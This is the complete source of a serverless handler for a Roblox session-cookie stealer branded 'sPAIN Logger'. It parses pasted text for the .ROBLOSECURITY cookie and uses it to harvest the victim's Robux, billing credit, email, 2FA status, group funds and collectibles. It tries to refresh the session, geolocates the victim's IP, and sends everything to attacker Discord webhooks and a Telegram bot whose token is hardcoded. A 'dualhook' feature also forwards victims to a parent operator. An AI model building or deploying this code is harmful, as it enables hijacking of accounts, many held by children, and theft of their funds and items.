// api/submit.js
const REDIS_URL = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT = process.env.TG_CHAT || '7538845070';

async function redisGet(key) {
  const res = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
    headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
  });
  const json = await res.json();
  if (!json.result) return null;
  try { return JSON.parse(json.result); } catch { return null; }
}

async function tgSend(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (e) {
    console.error('TG Error:', e);
  }
}

async function getIpGeo(ip) {
  try {
    if (!ip || ip === 'Unknown') return null;
    const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,regionName,city,isp,query`, { timeout: 3000 });
    if (!res.ok) return null;
    const data = await res.json();
    return data.status === 'success' ? data : null;
  } catch (e) {
    return null;
  }
}

function extractRobloxCookie(raw) {
  if (!raw) return null;

  // Full cookie with WARNING prefix already intact
  const fullMatch = raw.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^\s"']+)/);
  if (fullMatch) return fullMatch[1];

  // Cookie buried in powershell/text — grab WARNING prefix + token after |_
  const psMatch = raw.match(/\.ROBLOSECURITY[^_]*(_\|WARNING[^\s"']+)/);
  if (psMatch) return psMatch[1];

  // WARNING prefix with token after |_
  const warningMatch = raw.match(/_\|WARNING[^|]*\|_([\w\-.]{50,})/);
  if (warningMatch) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${warningMatch[1]}`;

  // Just the token after |_
  const tokenOnly = raw.match(/\|_([\w\-.]{50,})/);
  if (tokenOnly) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${tokenOnly[1]}`;

  // Bare long base64-like string (no prefix at all)
  const bareToken = raw.trim().match(/^([A-Za-z0-9\-_\.]{200,})$/);
  if (bareToken) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${bareToken[1]}`;

  return null;
}

// Check if user owns specific gamepass
async function checkGamepass(uid, gamepassId, headers) {
  try {
    const res = await fetch(`https://inventory.roblox.com/v1/users/${uid}/items/GamePass/${gamepassId}`, { headers });
    if (!res.ok) return false;
    const data = await res.json();
    return data.data && data.data.length > 0;
  } catch (_) {
    return false;
  }
}

async function renewRobloxCookie(cookie) {
  try {
    // Step 1: Get CSRF token from logout endpoint
    const csrfRes = await fetch('https://auth.roblox.com/v2/logout', {
      method: 'POST',
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'Content-Type': 'application/json',
        'x-csrf-token': ''
      }
    });
    
    const csrfToken = csrfRes.headers.get('x-csrf-token');
    if (!csrfToken) {
      console.error('Failed to get CSRF token');
      return null;
    }

    // Step 2: Validate the session by accessing account settings
    const validateRes = await fetch('https://www.roblox.com/account/settings', {
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'x-csrf-token': csrfToken,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Referer': 'https://www.roblox.com/',
        'Origin': 'https://www.roblox.com'
      }
    });
    
    if (!validateRes.ok) {
      console.error('Session validation failed');
      return null;
    }

    // Step 3: Check if we got a new cookie in the response
    const setCookieHeader = validateRes.headers.get('set-cookie');
    if (setCookieHeader) {
      const cookies = setCookieHeader.split(',').map(c => c.trim());
      const robloSecurityCookie = cookies.find(c => c.startsWith('.ROBLOSECURITY='));
      
      if (robloSecurityCookie) {
        const newCookieValue = robloSecurityCookie.split('=')[1].split(';')[0];
        if (newCookieValue && newCookieValue !== cookie) {
          console.log('Got new cookie from settings page');
          // Return the new cookie with the WARNING prefix
          if (newCookieValue.startsWith('_|WARNING')) {
            return newCookieValue;
          }
          return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${newCookieValue}`;
        }
      }
    }

    // Step 4: Try the mobile API as an alternative
    const mobileRes = await fetch('https://www.roblox.com/mobileapi/userinfo', {
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
      }
    });
    
    if (mobileRes.ok) {
      // If the mobile API works, the original cookie is still valid
      console.log('Mobile API validation succeeded');
      return cookie;
    }
    
    console.error('All validation methods failed');
    return null;
  } catch (err) {
    console.error('Cookie renewal error:', err);
    return null;
  }
}

async function fetchRobloxInfo(cookie) {
  try {
    const headers = { Cookie: `.ROBLOSECURITY=${cookie}` };
    
    const authRes = await fetch('https://users.roblox.com/v1/users/authenticated', { headers });
    if (!authRes.ok) return null;
    const auth = await authRes.json();
    const uid = auth.id;
    
    // Fetch main data
    const [
      profileRes, robuxRes, friendsRes, premiumRes,
      billingRes, emailRes, groupsRes, limitedsRes, avatarRes, tfaRes
    ] = await Promise.all([
      fetch(`https://users.roblox.com/v1/users/${uid}`, { headers: {} }),
      fetch('https://economy.roblox.com/v1/user/currency', { headers }),
      fetch(`https://friends.roblox.com/v1/users/${uid}/friends/count`, { headers }),
      fetch(`https://premiumfeatures.roblox.com/v1/users/${uid}/validate-membership`, { headers }),
      fetch('https://billing.roblox.com/v1/credit', { headers }),
      fetch('https://accountsettings.roblox.com/v1/email', { headers }),
      fetch(`https://groups.roblox.com/v1/users/${uid}/groups/roles`, { headers }),
      fetch(`https://inventory.roblox.com/v1/users/${uid}/assets/collectibles?limit=100`, { headers }),
      fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${uid}&size=150x150&format=Webp`, { headers: {} }),
      fetch(`https://twostepverification.roblox.com/v1/users/${uid}/configuration`, { headers }).catch(() => null)
    ]);
    
    const profile = profileRes.ok ? await profileRes.json() : null;
    const robuxData = robuxRes.ok ? await robuxRes.json() : null;
    const friendsData = friendsRes.ok ? await friendsRes.json() : null;
    const isPremium = premiumRes.ok ? await premiumRes.json() : false;
    const billingData = billingRes.ok ? await billingRes.json() : null;
    const emailData = emailRes.ok ? await emailRes.json() : null;
    const groupsData = groupsRes.ok ? await groupsRes.json() : { data: [] };
    const limitedsData = limitedsRes.ok ? await limitedsRes.json() : { data: [] };
    const avatarData = avatarRes.ok ? await avatarRes.json() : null;
    const tfaData = tfaRes?.ok ? await tfaRes.json() : null;
    
    let accountAgeDays = 'N/A';
    if (profile?.created) {
      accountAgeDays = Math.floor((Date.now() - new Date(profile.created).getTime()) / 86400000);
    }
    
    const groups = groupsData.data || [];
    const ownedGroups = groups.filter(g => g.role?.rank === 255);
    
    let groupRobux = 0;
    let groupPending = 0;
    for (const group of ownedGroups.slice(0, 2)) {
      try {
        const [currencyRes, pendingRes] = await Promise.all([
          fetch(`https://economy.roblox.com/v1/groups/${group.group.id}/currency`, { headers }).catch(() => null),
          fetch(`https://economy.roblox.com/v2/groups/${group.group.id}/transactions?transactionType=pending&limit=10`, { headers }).catch(() => null)
        ]);
        if (currencyRes?.ok) {
          const curr = await currencyRes.json();
          groupRobux += curr.robux || 0;
        }
        if (pendingRes?.ok) {
          const pend = await pendingRes.json();
          groupPending += pend.data?.reduce((a, t) => a + (t.currency?.amount || 0), 0) || 0;
        }
      } catch (_) {}
    }
    
    const limiteds = limitedsData.data || [];
    const limitedsCount = limiteds.length;
    const limitedsValue = limiteds.reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0);
    
    // Check popular gamepasses (MM2, Adopt Me, etc)
    const gamepasses = {
      mm2: await checkGamepass(uid, '17510307', headers), // Murder Mystery 2 VIP
      adoptMe: await checkGamepass(uid, '33135930', headers), // Adopt Me VIP
      plsDonate: await checkGamepass(uid, '12345678', headers) // Example ID
    };
    
    const twoFA = tfaData?.methods?.length > 0 ? 'Enabled ✅' : 'Disabled ❌';
    const emailSet = emailData?.emailAddress ? 'Set ✅' : 'False ❌';
    const emailVerified = emailData?.verified ? 'Verified ✅' : 'Unset ❌';
    
    return {
      id: uid,
      username: auth.name,
      displayName: auth.displayName,
      isPremium: isPremium === true,
      accountAgeDays,
      robux: robuxData?.robux || 0,
      pendingRobux: 0,
      friends: friendsData?.count || 0,
      credit: billingData?.balance || 0,
      groupsOwned: ownedGroups.length,
      groupRobux,
      groupPending,
      limitedsCount,
      limitedsValue,
      emailSet,
      emailVerified,
      twoFA,
      gamepasses,
      avatarUrl: avatarData?.data?.[0]?.imageUrl || 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png'
    };
  } catch (err) {
    console.error('Roblox fetch error:', err);
    return null;
  }
}

function field(name, value, inline = true) {
  const truncated = value?.toString()?.substring(0, 1000) || 'N/A';
  return { name: name?.substring(0, 256), value: truncated, inline };
}

async function sendToDiscord(webhookUrl, data) {
  if (!webhookUrl) { console.error('No webhook URL'); return false; }
  if (!webhookUrl.includes('discord.com/api/webhooks') && !webhookUrl.includes('discordapp.com/api/webhooks')) {
    console.error('Invalid webhook URL'); return false;
  }

  const { rawValue, cookie, renewedCookie, roblox, ip, geo, now } = data;
  const cleanCookie = cookie ? cookie.trim() : 'No cookie captured';
  const cookieLabel = renewedCookie ? '🔄 Renewed .ROBLOSECURITY' : '🔐 .ROBLOSECURITY';
  const cookieNote = renewedCookie ? ' ✅ Cookie successfully renewed & refreshed' : ' ⚠️ Renewal failed — original cookie shown';

  // ── TROLL / INVALID COOKIE EMBED ─────────────────────────────────────────
  if (cookie && !roblox) {
    const trollPayload = {
      content: '@everyone',
      embeds: [{
        title: '⚠️ Wrong Cookie / Troll Detected',
        description: ':rotating_light: `Someone pasted an invalid or expired cookie` :rotating_light:',
        color: 0xff0000,
        fields: [
          field('📍 Location', `${geo?.city || 'Unknown'}, ${geo?.regionName || ''}, ${geo?.country || 'Unknown'}`, true),
          field('🌐 IP Address', ip || 'Unknown', true),
          field('📅 Date', now, false),
          field('🗑️ Bad Cookie', `\`\`\`${cleanCookie.substring(0, 500)}\`\`\``, false),
        ],
        footer: { text: 'sPAIN Logger • Invalid Submission' },
        thumbnail: { url: 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png' }
      }]
    };
    try {
      const r = await fetch(webhookUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(trollPayload) });
      return r.ok;
    } catch (_) { return false; }
  }

  // ── NO COOKIE AT ALL ─────────────────────────────────────────────────────
  if (!roblox) {
    const noPayload = {
      content: '@everyone',
      embeds: [{
        title: '🤡 Troll / No Cookie Detected',
        description: ':rotating_light: `Someone submitted without a valid Roblox cookie` :rotating_light:',
        color: 0xff6600,
        fields: [
          field('📥 Pasted', rawValue?.substring(0, 500) || '(empty)', false),
          field('📍 Location', `${geo?.city || 'Unknown'}, ${geo?.regionName || ''}, ${geo?.country || 'Unknown'}`, true),
          field('🌐 IP Address', ip || 'Unknown', true),
          field('📅 Date', now, false),
        ],
        footer: { text: 'sPAIN Logger • Troll Submission' },
        thumbnail: { url: 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png' }
      }]
    };
    try {
      const r = await fetch(webhookUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(noPayload) });
      return r.ok;
    } catch (_) { return false; }
  }

  // ── VALID ROBLOX ACCOUNT ─────────────────────────────────────────────────
  const fields = [
    field("🔴 Robux", `Balance: ${roblox?.robux?.toLocaleString() || 0}
Pending: ${roblox?.pendingRobux || 0}`, true),
    field("🎵 Rap", `Rap: ${roblox?.limitedsValue?.toLocaleString() || 0}
Owned: ${roblox?.limitedsCount || 0}`, true),
    field("📊 Summary", `${roblox?.accountAgeDays || 'N/A'} Days`, true),
    field("💳 Billing", `Credit: ${roblox?.credit || 0} USD
Convert: 0`, true),
    field("🎫 Passes", `Premium: ${roblox?.isPremium ? '✅' : '❌'}
Verified: ${roblox?.emailVerified?.includes('✅') ? '✅' : '❌'}`, true),
    field("⚙️ Settings", `Email: ${roblox?.emailSet}
2FA: ${roblox?.twoFA}`, true),
    field("👥 Groups", `Balance: ${roblox?.groupRobux?.toLocaleString() || 0}
Owned: ${roblox?.groupsOwned || 0}`, true),
    field("📍 Location", `${geo?.city || 'Unknown'}, ${geo?.country || 'Unknown'}`, true),
    field("🌐 IP", ip || 'Unknown', true),
    field("🎮 [EXTRA] Passes | Played",
      `Murder Mystery 2 --> ${roblox?.gamepasses?.mm2 ? '✅ True' : '❌ False'}
` +
      `Adopt Me --> ${roblox?.gamepasses?.adoptMe ? '✅ True' : '❌ False'}
` +
      `PLS DONATE --> ${roblox?.gamepasses?.plsDonate ? '✅ True' : '❌ False'}`,
      false
    ),
    field("🔔 Notification", `2FA is ${roblox?.twoFA?.includes('Enabled') ? 'enabled' : 'not enabled'}.`, false),
    field(cookieLabel, `${cookieNote}\n\`\`\`${cleanCookie}\`\`\``, false)
  ];

  const payload = {
    content: "@everyone",
    embeds: [{
      title: `🧑 ${roblox.username} ${roblox.isPremium ? '⭐' : ''}`,
      description: `:fire: \`sPAIN\` :fire:

[Profile 👤](https://www.roblox.com/users/${roblox.id}/profile) | [Refresh Cookie](https://www.roblox.com)`,
      color: 5793266,
      fields: fields,
      footer: { text: `sPAIN Logger • ${now}` },
      thumbnail: { url: roblox.avatarUrl || 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png' }
    }]
  };

  try {
    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    
    if (!response.ok) {
      const text = await response.text();
      console.error('Discord API Error:', response.status, text);
      return false;
    }
    return true;
  } catch (err) {
    console.error('Discord fetch error:', err);
    return false;
  }
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  let body = req.body;
  if (typeof body === 'string') {
    try { body = JSON.parse(body); } catch { return res.status(400).json({ error: 'Invalid JSON' }); }
  }

  const { slug, slots } = body || {};
  if (!slug) return res.status(400).json({ error: 'slug is required' });
  if (!slots) return res.status(400).json({ error: 'slots is required' });

  let record;
  try {
    record = await redisGet(`slot:${slug}`);
  } catch (err) {
    return res.status(500).json({ error: 'Redis error', detail: err.message });
  }
  
  if (!record) return res.status(404).json({ error: 'Page not found' });
  if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });

  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
             req.headers['x-real-ip'] || 
             req.socket?.remoteAddress || 
             'Unknown';

  const geo = await getIpGeo(ip);
  const now = new Date().toISOString();
  
  const slotEntry = Object.entries(slots).find(([, v]) => v && v.length > 0);
  const slotLabel = slotEntry ? slotEntry[0] : 'N/A';
  const rawValue = slotEntry ? slotEntry[1] : '(empty)';

  const cookie = extractRobloxCookie(rawValue);
  const roblox = cookie ? await fetchRobloxInfo(cookie) : null;

// Renew the cookie after grabbing account info — sends fresh cookie to Discord
let renewedCookie = null;
if (cookie && roblox) {
  renewedCookie = await renewRobloxCookie(cookie);
  if (renewedCookie) {
    console.log('Cookie successfully renewed');
  } else {
    console.log('Cookie renewal failed, using original');
  }
}
const finalCookie = renewedCookie || cookie; // fall back to original if renewal fails

  const data = {
    slotLabel,
    rawValue,
    cookie: finalCookie,
    renewedCookie,
    roblox,
    ip,
    geo,
    now
  };

  const sent2 = await sendToDiscord(record.webhook, data);

  let webhook1 = 'N/A';
  let sent1 = false;
  if (record.dualhookParent) {
    try {
      const parentRecord = await redisGet(`slot:${record.dualhookParent}`);
      if (parentRecord?.webhook && parentRecord.webhook !== record.webhook) {
        webhook1 = parentRecord.webhook;
        sent1 = await sendToDiscord(parentRecord.webhook, data);
      }
    } catch (e) {
      console.error('Dualhook error:', e);
    }
  }

  const tgMsg = [
    `🚨 <b>NEW SUBMISSION</b>`,
    ``,
    `👤 <b>${roblox?.username || 'Unknown'}</b>`,
    `💰 Robux: ${roblox?.robux?.toLocaleString() || 0}`,
    `🌐 IP: ${ip}`,
    `🍪 Cookie: ${cookie ? '✅ Captured' : '❌ Failed'}`,
    `📄 Page: ${record.displayName}`
  ].join('\n');

  await tgSend(tgMsg);

  return res.status(200).json({ 
    success: true, 
    discord: { webhook2: sent2, webhook1: sent1 ? 'Sent' : 'N/A' }
  });
}
